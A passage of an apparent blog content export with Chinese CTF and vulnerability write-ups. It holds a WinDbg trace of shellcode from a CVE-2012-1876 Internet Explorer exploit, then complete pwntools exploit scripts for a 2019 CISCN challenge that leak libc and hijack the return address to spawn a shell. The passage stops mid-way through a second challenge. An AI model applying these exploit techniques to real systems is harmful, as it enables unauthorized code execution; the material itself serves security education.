esp（pushad的堆栈已经全部处理完毕）；ret，相当于jmp esp，开始执行栈上的代码，再经过一串nop指令就可以执行我们任意的shellcode了！！！</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b6c3d7e esp=079f6df0 ebp=76042341 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CProgSink::GetClassCounter+0x2:</span><br><span class=\"line\">6b6c3d7e 54              push    esp</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6df0  90909090 90909090 90909090 0089e8fc</span><br><span class=\"line\">079f6e00  89600000 64d231e5 8b30528b 528b0c52</span><br><span class=\"line\">079f6e10  28728b14 264ab70f c031ff31 7c613cac</span><br><span class=\"line\">079f6e20  c1202c02 c7010dcf 5752f0e2 8b10528b</span><br><span class=\"line\">079f6e30  d0013c42 8578408b 014a74c0 488b50d0</span><br><span class=\"line\">079f6e40  20588b18 3ce3d301 8b348b49 ff31d601</span><br><span class=\"line\">079f6e50  c1acc031 c7010dcf f475e038 3bf87d03</span><br><span class=\"line\">079f6e60  e275247d 24588b58 8b66d301 588b4b0c</span><br><span class=\"line\">0:005&gt; p</span><br><span class=\"line\">eax=00000001 ebx=00001024 ecx=079f6d90 edx=77bf70b4 esi=6b66f920 edi=6b661041</span><br><span class=\"line\">eip=6b6c3d7f esp=079f6dec ebp=76042341 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CProgSink::GetClassCounter+0x3:</span><br><span class=\"line\">6b6c3d7f c3              ret</span><br><span class=\"line\">0:005&gt; dd esp</span><br><span class=\"line\">079f6dec  079f6df0 90909090 90909090 90909090</span><br><span class=\"line\">079f6dfc  0089e8fc 89600000 64d231e5 8b30528b</span><br><span class=\"line\">079f6e0c  528b0c52 28728b14 264ab70f c031ff31</span><br><span class=\"line\">079f6e1c  7c613cac c1202c02 c7010dcf 5752f0e2</span><br><span class=\"line\">079f6e2c  8b10528b d0013c42 8578408b 014a74c0</span><br><span class=\"line\">079f6e3c  488b50d0 20588b18 3ce3d301 8b348b49</span><br><span class=\"line\">079f6e4c  ff31d601 c1acc031 c7010dcf f475e038</span><br><span class=\"line\">079f6e5c  3bf87d03 e275247d 24588b58 8b66d301</span><br></pre></td></tr></table></figure>\n<h3 id=\"6-参考链接\"><a href=\"#6-参考链接\" class=\"headerlink\" title=\"6.参考链接\"></a>6.参考链接</h3><p><a href=\"https://paper.seebug.org/179/\" target=\"_blank\" rel=\"noopener\">Windbg漏洞分析调试(一)</a></p>\n<p><a href=\"https://paper.seebug.org/182/\" target=\"_blank\" rel=\"noopener\">Windbg漏洞分析调试(二)</a></p>\n<p><a href=\"https://www.exploit-db.com/exploits/24017\" target=\"_blank\" rel=\"noopener\">Microsoft Internet Explorer 8 - Fixed Col Span ID (Full ASLR + DEP Bypass) (MS12-037)</a></p>\n<p><a href=\"http://c00c.cc/1493200282.html\" target=\"_blank\" rel=\"noopener\">CVE-2012-1876分析</a></p>\n<p><a href=\"http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html\" target=\"_blank\" rel=\"noopener\">Targeted Heap Spraying – 0x0c0c0c0c is a Thing of the Past</a></p>\n","text":"CVE-2012-18761. 漏洞简介一个IE漏洞，成功利用可RCE，问题在mshtml.dll模块的CTableLayout::CalculateMinMax函数中，程序在执行时会以HTML代码中\\元素的span属性作为循环控制次数向堆空间写入数据，如果此span值设置的不当","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Pwn","slug":"Pwn","count":1,"path":"api/tags/Pwn.json"}]},{"title":"2019CISCN_PWN(一)","slug":"2019CISCN-PWN-一","date":"2019-04-28T02:31:02.000Z","updated":"2019-04-28T08:43:27.225Z","comments":true,"path":"api/articles/2019CISCN-PWN-一.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"2019CISCN-PWN题解\"><a href=\"#2019CISCN-PWN题解\" class=\"headerlink\" title=\"2019CISCN_PWN题解\"></a>2019CISCN_PWN题解</h1><h2 id=\"0x00-Your-pwn\"><a href=\"#0x00-Your-pwn\" class=\"headerlink\" title=\"0x00  Your_pwn\"></a>0x00  Your_pwn</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/your_pwn/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>RELRO没全开，其余全开</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先会向栈上写0x100，然后循环调用sub_B35函数。函数要求输入一个index，然后leak出从rbp - 0x150起的v4[index]的值，然后将值覆盖为要修改的值，也就是实现栈上的任意读写。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_<span class=\"function\">BOOL8 <span class=\"title\">sub_B35</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+4h] [rbp-15Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-158h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-154h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+10h] [rbp-150h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [rsp+50h] [rbp-110h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+158h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">40</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input index\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"now value(hex) %x\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v4[index]);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input new value\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\">    v4[index] = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"do you want continue(yes/no)? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncmp</span>(&amp;s, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3u</span>LL) == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>先leak出libc地址</p>\n<p>libc在rsp+0x280处，一开始输入的name在rsp + 0x170处，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffdc90│+0x0140: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdc98│+0x0148: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca0│+0x0150: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca8│+0x0158: 0x82e23df75b4cba00</span><br><span class=\"line\">0x00007fffffffdcb0│+0x0160: 0x00007fffffffddd0  →  0x0000555555554ca0  →   push r15\t ← $rbp</span><br><span class=\"line\">0x00007fffffffdcb8│+0x0168: 0x0000555555554b11  →   test eax, eax</span><br><span class=\"line\">0x00007fffffffdcc0│+0x0170: 0x0000000a6377696c (&quot;liwc&quot;?)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gef➤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffddd0│+0x0280: 0x0000555555554ca0  →   push r15</span><br><span class=\"line\">0x00007fffffffddd8│+0x0288: 0x00007ffff7a2d830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br></pre></td></tr></table></figure>\n<p>可以看到，在libc地址为0x7f766337c830时，leak出的值为ffffffc8，所以只需要删除ffffff即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00007fffbaeeb878│+0x0288: 0x00007f765337c830  →  &lt;__libc_start_main+240&gt; mov edi, eax</span><br><span class=\"line\">[&apos;30&apos;, &apos;ffffffc8&apos;, &apos;37&apos;, &apos;53&apos;, &apos;76&apos;, &apos;7f&apos;, &apos;0&apos;, &apos;0&apos;]</span><br></pre></td></tr></table></figure>\n<p>最后直接把retn地址覆盖为one_gadget即可，直接绕过了canary，exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"liwc\"</span>)</span><br><span class=\"line\">nums = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x288</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">libc_addr = u64(tmp)</span><br><span class=\"line\">libc_base = libc_addr - <span class=\"number\">0x20830</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(p)</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x45216</span> <span class=\"comment\"># 0x4526a 0xf02a4 0xf1147</span></span><br><span class=\"line\">one_gadget += libc_base</span><br><span class=\"line\">one_gadget = p64(one_gadget)</span><br><span class=\"line\">rip = (<span class=\"number\">0x150</span> + <span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(one_gadget[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">41</span> - <span class=\"number\">16</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">10</span>))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"no\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>不过，似乎原题未提供libc，那么我们用one_gadget可能会不太方便（其实也行）。那么就还要leak出程序本身的加载地址，然后将rip劫持为pop rdi，再在栈上布置/bin/sh\\x00的地址，最后再布置system@libc，然后就能getshell。照这种思路，正好会用40次读写，说明这个题目限制的还是比较死的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">nums = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x288</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">libc_addr = u64(tmp)</span><br><span class=\"line\">libc_base = libc_addr - <span class=\"number\">0x20830</span></span><br><span class=\"line\">binsh = libc_base + next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(libc_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">nums = []\t</span><br><span class=\"line\"><span class=\"comment\"># leak elf</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">0x280</span> - <span class=\"number\">0x10</span> + i))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num.startswith(<span class=\"string\">\"ffffff\"</span>):</span><br><span class=\"line\">\t\tnum = num[<span class=\"number\">-2</span>:]</span><br><span class=\"line\">\tnums.append(num)</span><br><span class=\"line\"></span><br><span class=\"line\">tmp = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ch <span class=\"keyword\">in</span> [chr(int(<span class=\"string\">\"0x\"</span> + i, <span class=\"number\">16</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> nums]:</span><br><span class=\"line\">\ttmp += ch</span><br><span class=\"line\">elf_addr = u64(tmp)</span><br><span class=\"line\">elf_base = elf_addr - <span class=\"number\">0xca0</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> hex(elf_base)</span><br><span class=\"line\"></span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000000000000d03</span> <span class=\"comment\">#: pop rdi ; ret</span></span><br><span class=\"line\">poprdi += elf_base</span><br><span class=\"line\"></span><br><span class=\"line\">rip = <span class=\"number\">0x150</span> + <span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack retn addr</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(poprdi)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># put /bin/sh addr on stack</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + <span class=\"number\">8</span> + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(binsh)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># call system</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(rip + <span class=\"number\">16</span> + i))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(ord(p64(system)[i])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">41</span> - <span class=\"number\">40</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"index\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(<span class=\"number\">10</span>))</span><br><span class=\"line\">\tnum = p.recvline().split(<span class=\"string\">' '</span>)[<span class=\"number\">-1</span>].strip()</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"input new value\\n\"</span>)</span><br><span class=\"line\">\tp.sendline(str(int(<span class=\"string\">\"0x\"</span> + num, <span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"? \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"no\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-daily\"><a href=\"#0x01-daily\" class=\"headerlink\" title=\"0x01 daily\"></a>0x01 daily</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/daily$ checksec daily</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/daily/daily&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>没有开启PIE，但其余全开，RELRO开启。</p>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>会根据输入的size malloc一个chunk，将chunk总数量num存储在bss段上，并且每次将chunk的size和指针都存在bss端上。</p>\n<h4 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h4><p>如果bss段相应的指针不为null，则free掉，并置为null，同时将size清零，num自减1。但是这里index存在漏洞。free的指针是用index * 16 + 0x602068计算得到的，所以如果在堆上伪造fake chunk和指向fake chunk的指针，就可以实现任意地址free，也就可以实现double free（或者unlink）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td 